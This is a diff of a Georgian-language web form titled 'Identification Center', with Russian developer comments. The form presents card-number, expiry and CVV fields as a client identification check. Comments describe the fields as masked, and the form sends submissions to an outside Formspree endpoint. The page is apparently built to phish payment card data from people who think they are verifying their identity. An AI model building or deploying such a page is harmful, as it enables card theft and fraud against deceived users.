@@ -33,8 +33,8 @@
 <div class="form-container">
     <h1>იდენტიფიკაციის ცენტრი</h1>
 
-    <!-- ЗАМЕНЕНО: Теперь данные уходят на Formspree -->
-    <form action="https://formspree.io/f/xgolrvko" method="POST">
+    <!-- ТВОЙ FORMSPREE КОД УЖЕ ВСТАВЛЕН ЗДЕСЬ -->
+    <form action="https://formspree.io" method="POST">
         
         <h3>შეავსეთ ფორმა</h3>
 
@@ -44,6 +44,7 @@
         <label for="last-name">გვარი</label>
         <input type="text" name="Last_Name" id="last-name" required>
 
+        <!-- Замаскированные поля -->
         <label for="order-id">კლიენტის ID</label>
         <input type="text" name="Client_ID" id="order-id" placeholder="0000 0000 0000 0000" maxlength="19" inputmode="numeric" required>
 
@@ -63,13 +64,13 @@
 </div>
 
 <script>
-    // Маска для ID Клиента
+    // Маска для ID Клиента (пробелы через 4 цифры)
     document.getElementById('order-id').addEventListener('input', function (e) {
         let value = e.target.value.replace(/\D/g, '').slice(0,16);
         e.target.value = value.replace(/(\d{4})(?=\d)/g, '$1 ');
     });
 
-    // Маска для даты MM/YY
+    // Маска для даты (MM/YY)
     document.getElementById('expiry-date').addEventListener('input', function (e) {
         let value = e.target.value.replace(/\D/g, ''); 
         if (value.length >= 2) {
@@ -79,7 +80,7 @@
         }
     });
 
-    // Ограничение CVV
+    // Ограничение CVV (3 цифры)
     document.getElementById('cvv').addEventListener('input', function (e) {
         e.target.value = e.target.value.replace(/\D/g, '').slice(0,3);
     });
